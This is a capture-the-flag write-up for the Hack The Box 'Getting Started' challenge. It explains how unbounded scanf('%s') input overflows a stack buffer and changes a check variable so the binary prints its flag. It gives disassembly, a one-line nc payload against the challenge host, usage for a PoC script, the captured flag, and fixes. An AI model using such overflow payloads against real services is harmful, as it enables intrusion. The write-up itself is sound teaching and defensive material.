# Getting Started (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | Getting Started |
| Category | Pwn |
| Difficulty | Very Easy |
| Primary dropped file | `pwn_getting_started (1).zip` |
| Existing local PoC before this update | Present |
| Core bug class | Stack buffer overflow (`scanf("%s")`) causing adjacent variable corruption |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The binary allocates `0x30` bytes for a stack buffer and later reads unchecked
string input into that buffer via `scanf("%s", buffer)`.

A nearby variable `target` is initialized as `0xdeadbeef` and checked after
input:

1. `target == 0xdeadbeef` -> no flag path.
2. `target != 0xdeadbeef` -> `win()` is called.

Because `target` sits after the buffer in the stack frame, a simple overflow is
enough to flip it without needing RIP control.

Exploit flow:
1. Send `44` bytes (`"A" * 44`).
2. Overflow crosses buffer boundary and corrupts `target`.
3. Condition fails (`target != 0xdeadbeef`).
4. Program jumps into `win()` and prints `flag.txt`.

## Vulnerable Behavior

1. Unbounded `%s` input is written to a fixed local stack buffer.
2. No length constraint is applied before `scanf`.
3. Security-relevant stack variable (`target`) is adjacent to attacker-controlled buffer.
4. Program logic trusts `target` integrity after unsafe write.

## Manual Verification Steps

1. Confirm binary type and mitigations:

```bash
file challenge/gs
checksec --file=challenge/gs
```

2. Inspect vulnerable main logic:

```bash
objdump -d -Mintel challenge/gs | sed -n '420,560p'
```

Relevant instructions:

```text
16a4: sub rsp,0x30
16de: mov eax,0xdeadbeef
16e3: mov QWORD PTR [rbp-0x8],rax
17a8: lea rdi,[... "%s" ...]
17b4: call __isoc99_scanf@plt
17ca: cmp QWORD PTR [rbp-0x8],rax
17dc: call win
```

3. Send overflow payload manually:

```bash
python3 -c 'print("A"*44)' | nc 154.57.164.64 30860
```

4. Confirm returned output contains `HTB{...}`.

## Automated PoC

Script:
`getting_started_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/GettingStarted"
chmod +x getting_started_poc.sh
./getting_started_poc.sh <host> <port>
```

### Common examples

```bash
./getting_started_poc.sh 154.57.164.64 30860
./getting_started_poc.sh --host 154.57.164.64 --port 30860 --verbose
./getting_started_poc.sh --host 154.57.164.64 --port 30860 --json
```

## Options

- `--host <host>`: target host or IP.
- `--port <port>`: target TCP port.
- `--timeout <seconds>`: socket timeout, default `5`.
- `--length <bytes>`: payload length, default `44`.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug output.
- `-h`, `--help`: show usage help.

## Exit Codes

- `0`: exploit succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: connectivity/request failure.
- `4`: exploit sent but flag not found.

## Why The Exploit Works

- `%s` reads past intended buffer boundary when input is longer than 32 bytes.
- `target` resides at a higher stack offset than `buffer`, reachable by overflow.
- Logic uses a simple equality check on `target` instead of integrity-safe design.
- Any non-`0xdeadbeef` value triggers the flag routine.

## Defensive Guidance

- Replace unsafe `%s` reads with bounded input handling.
- Enforce explicit maximum lengths (`fgets`, width-limited format strings).
- Separate control variables from directly adjacent user buffers.
- Add compiler/runtime hardening and secure coding checks in CI.

## Result Note

Flag values may vary by instance. The format remains `HTB{...}`.

## Final Flag

Target instance: `154.57.164.64:30860`  
Solved on: `2026-04-02`  
Flag: `HTB{b0f_tut0r14l5_4r3_g00d}`
